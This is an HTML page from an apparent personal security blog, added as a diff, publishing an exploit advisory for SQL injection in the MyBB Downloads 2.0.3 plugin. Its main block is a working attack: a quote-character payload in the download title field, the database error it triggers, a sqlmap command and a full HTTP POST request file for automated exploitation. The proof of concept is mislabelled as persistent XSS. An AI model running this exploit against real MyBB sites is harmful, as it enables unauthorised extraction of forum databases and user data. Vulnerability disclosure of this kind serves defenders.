@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" type="text/css" href="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.0.2/cookieconsent.min.css" />
+<script async defer src="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.0.2/cookieconsent.min.js"></script>
+<script>
+window.addEventListener("load", function(){
+window.cookieconsent.initialise({
+  "palette": {
+    "popup": {
+      "background": "#424242"
+    },
+    "button": {
+      "background": "#2a7ae2"
+    }
+  },
+  "content": {
+    "href": "/privacy-policy"
+  }
+})});
+</script>
+  
+  
+  
+  <title>MyBB Downloads 2.0.3 - SQL Injection</title>
+  <meta name="description" content="MyBB Downloads it is a plugin (MyBB) which adds a page to download files. If enabled, regular members can add new downloads to the page after admin approval.">
+  
+    
+    <meta name="keywords" content="Lucian Nitescu, exploit, sql, injection, security, Lucian Ioan Nitescu, hacking, MyBB, MyBB Downloads, vulnerability, sqli">
+  
+
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="https://nitesculucian.github.io/2018/11/06/mybb-downloads-2-0-3-sql-injection/">
+  
+  
+  <link rel="alternate" type="application/rss+xml" title="Lucian Nitescu" href="https://nitesculucian.github.io/feed.xml">
+  <meta name="flattr:id" content="njnwdo">
+  <!-- Hotjar Tracking Code for https://nitesculucian.github.io/ -->
+<script>
+    (function(h,o,t,j,a,r){
+        h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
+        h._hjSettings={hjid:1067531,hjsv:6};
+        a=o.getElementsByTagName('head')[0];
+        r=o.createElement('script');r.async=1;
+        r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
+        a.appendChild(r);
+    })(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');
+</script>
+
+
+
+    
+    
+    
+    	
+    
+
+
+  
+  <meta name="twitter:card" content="summary">
+  
+  <meta name="twitter:title" content="MyBB Downloads 2.0.3 - SQL Injection">
+  <meta name="twitter:description" content="MyBB Downloads it is a plugin (MyBB) which adds a page to download files. If enabled, regular members can add new downloads to the page after admin approval.">
+  
+  
+  
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css?family=Bitter:400,400i,700" rel="stylesheet">
+
+  
+  <!-- Google Analytics -->
+  <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-107695141-1', 'auto');
+    ga('send', 'pageview');
+
+  </script>
+
+
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Lucian Nitescu</a>
+
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/">Home</a>
+      
+        
+        <a class="page-link" href="/about/">Whoami</a>
+      
+        
+        <a class="page-link" href="/archives/">Archives</a>
+      
+    </nav>
+    <br>Security Blog
+  </div>
+
+</header>
+
+
+    <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    
+      <h1 class="post-title" itemprop="name headline">MyBB Downloads 2.0.3 - SQL Injection</h1>
+    
+    <p class="post-meta"><time datetime="2018-11-06T21:17:00-03:00" itemprop="datePublished">Nov 6, 2018</time> •
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/categories/my-exploits/">my_exploits</a>,
+      
+    
+      
+    
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/categories/offensive-security/">offensive_security</a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  
+
+
+
+</p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <p>MyBB Downloads it is a plugin (MyBB) which adds a page to download files. If enabled, regular members can add new downloads to the page after admin approval.</p>
+
+<h4 id="intial-submissions">Intial Submissions</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Exploit Title: MyBB Downloads 2.0.3 - SQL Injection
+# Date: 28-10-2018
+# Exploit Author: Lucian Ioan Nitescu
+# Contact: https://twitter.com/LucianNitescu
+# Webiste: https://nitesculucian.github.io
+# Vendor Homepage: https://github.com/vintagedaddyo/MyBB_Plugin-Downloads
+# Software Link: https://github.com/vintagedaddyo/MyBB_Plugin-Downloads
+# Version: 2.0.3
+# Tested on: Ubuntu 18.04
+ 
+1. Description:  
+ 
+It is a plugin which adds a page to download files. If enabled, regular members can add new downloads to the page after admin approval.  
+ 
+2. Proof of Concept: 
+ 
+Persistent XSS  
+- Go to downloads.php page  
+- Create a New Download  
+- Add the following to the title: a"
+- Now on submit, the user will be prompted to an SQL Injection specific error.
+ 
+```
+MyBB has experienced an internal SQL error and cannot continue.
+ 
+SQL Error:
+    1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"a""' at line 1
+Query:
+    SELECT * FROM mybb_downloads WHERE name="a""
+```
+ 
+- THis can be exploited with: sqlmap -r request_file -p name --threads 5
+ 
+3. Request File example:
+ 
+POST /downloads.php?newdownload=1 HTTP/1.1
+Host: localhost:8081
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost:8081/downloads.php?newdownload=1
+Content-Type: multipart/form-data; boundary=---------------------------171894060312075061251712806160
+Content-Length: 1029
+Cookie: mybb[lastvisit]=1540744980; mybb[lastactive]=1540745020; sid=677a58d33fe23e7f2ea3841c79496fcd; loginattempts=1; mybbuser=3_waeMfSMiIRrTpPqW2uy8ZF8AMx8pyRtMCUJ6Gx0yoGRyLBsBow
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+ 
+-----------------------------171894060312075061251712806160
+Content-Disposition: form-data; name="my_post_key"
+ 
+6cb47e578ed16aa5272c55b0cb8745b4
+-----------------------------171894060312075061251712806160
+Content-Disposition: form-data; name="name"
+ 
+a"
+-----------------------------171894060312075061251712806160
+Content-Disposition: form-data; name="shortdesc"
+ 
+test
+-----------------------------171894060312075061251712806160
+Content-Disposition: form-data; name="description"
+ 
+test
+-----------------------------171894060312075061251712806160
+Content-Disposition: form-data; name="image"
+ 
+ 
+-----------------------------171894060312075061251712806160
+Content-Disposition: form-data; name="url"
+ 
+1
+-----------------------------171894060312075061251712806160
+Content-Disposition: form-data; name="numimages"
+ 
+4
+-----------------------------171894060312075061251712806160
+Content-Disposition: form-data; name="submit"
+ 
+Publish download
+-----------------------------171894060312075061251712806160--
+ 
+3. Solution:
+ 
+There is no public available solution.
+</code></pre></div></div>
+
+<h4 id="public-appearances">Public appearances</h4>
+
+<ul>
+  <li>Exploit Database: <a href="https://www.exploit-db.com/exploits/45747/">https://www.exploit-db.com/exploits/45747/</a></li>
+  <li>Packet Storm Security: <a href="https://packetstormsecurity.com/files/149993/mybbdownloads203-sql.txt">https://packetstormsecurity.com/files/149993/mybbdownloads203-sql.txt</a></li>
+  <li>0day.today: <a href="https://0day.today/exploit/31498">https://0day.today/exploit/31498</a></li>
+  <li>CXSecurity: <a href="https://cxsecurity.com/issue/WLB-2018100251">https://cxsecurity.com/issue/WLB-2018100251</a></li>
+</ul>
+
+<h4 id="other-references">Other references</h4>
+
+<ul>
+  <li><a href="https://nitesculucian.github.io/2018/10/28/attackdefense-com-sxss-mybb-downloads-plugin/">https://nitesculucian.github.io/2018/10/28/attackdefense-com-sxss-mybb-downloads-plugin/</a></li>
+</ul>
+
+  </div>
+
+  
+    <div class="post-comments" itemprop="comment">
+      <hr />
+<h1>Comments</h1>
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://nitesculucian.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+    </div>
+  
+
+</article>
+
+      </div>
+    </main>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <p>
+      
+
+&copy; Lucian Nitescu - Powered by <a href="https://jekyllrb.com">Jekyll</a> &amp; <a href="https://github.com/yous/whiteglass">whiteglass</a> - Subscribe via <a href="https://nitesculucian.github.io/feed.xml">RSS</a>
+
+      | <a href="/privacy-policy" >Privacy Policy</a>
+      | <a href="/legal-disclaimer" >Legal Disclaimer</a>
+    </p>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
